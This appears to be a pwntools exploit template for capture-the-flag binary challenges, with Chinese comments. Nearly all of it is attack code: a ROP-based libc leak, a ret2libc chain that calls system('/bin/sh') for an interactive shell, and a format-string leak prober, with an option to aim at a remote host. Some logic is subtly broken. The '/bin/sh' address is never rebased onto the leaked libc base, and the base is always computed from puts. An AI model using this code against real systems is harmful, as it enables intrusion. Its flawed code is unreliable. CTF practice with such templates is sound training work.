#!/usr/bin/env python3
"""
pwntools 解题模板（需要: pip install pwntools）

用法:
  python pwn_template.py ./pwn            # 本地调试
  python pwn_template.py ./pwn libc.so.6  # 指定 libc
  修改代码中的 HOST/PORT 或 remove注释进行远程连接
"""
import sys
from pwn import *

# ================= 配置区 =================
context.arch = "amd64"        # 按实际修改: i386 / amd64 / arm
context.log_level = "info"    # debug 可看全部交互
context.terminal = ["cmd.exe", "/c", "start", "cmd", "/k"]  # Windows 调试器窗口

HOST, PORT = "1.2.3.4", 9999

# ================= 连接 =================
if len(sys.argv) >= 2:
    binary_path = sys.argv[1]
    elf = ELF(binary_path, checksec=True)
    context.arch = elf.arch
    libc_path = sys.argv[2] if len(sys.argv) >= 3 else None
    libc = ELF(libc_path, checksec=False) if libc_path else None

    # 本地调试运行 (gdb attach 请自行加)
    p = process(binary_path)
    # 远程: p = remote(HOST, PORT)
else:
    print("用法: python pwn_template.py <binary> [libc]")
    sys.exit(1)

# ================= 常用工具函数 =================

def leak(func_name="puts", symbol="main"):
    """泄露 libc 地址"""
    pop_rdi = next(elf.search(asm("pop rdi; ret")))
    ret = next(elf.search(asm("ret")))
    payload = flat(
        b"A" * OFFSET,           # TODO: cyclic 确定偏移
        pop_rdi, elf.got[func_name],
        elf.plt[func_name],
        elf.symbols[symbol],
    )
    p.sendlineafter(b"> ", payload)   # TODO: 修改提示符
    leak_addr = u64(p.recvline().strip().ljust(8, b"\x00"))
    log.success(f"{func_name} @ {leak_addr:#x}")
    return leak_addr


def ret2libc():
    """标准 ret2libc (64位)"""
    leak_addr = leak()
    base = leak_addr - libc.symbols["puts"]
    log.success(f"libc base = {base:#x}")
    system = base + libc.symbols["system"]
    binsh = next(libc.search(b"/bin/sh\x00"))
    pop_rdi = next(elf.search(asm("pop rdi; ret")))
    ret = next(elf.search(asm("ret")))
    payload = flat(
        b"A" * OFFSET,
        ret,                      # 16字节栈对齐
        pop_rdi, binsh,
        system,
    )
    p.sendline(payload)
    p.interactive()


def fmt_leak(offset, count=20):
    """格式化字符串泄露探测"""
    for i in range(offset, offset + count):
        p.sendlineafter(b"> ", f"%{i}$p".encode())
        resp = p.recvline().strip()
        log.info(f"%{i}$p -> {resp}")


# ================= 主逻辑 =================
if __name__ == "__main__":
    # TODO: 在此编写题目逻辑
    # 1. 偏移确定: p.sendline(cyclic(200)); 崩溃后 cyclic_find(core 值)
    # 2. 按题型选择攻击方式
    p.interactive()
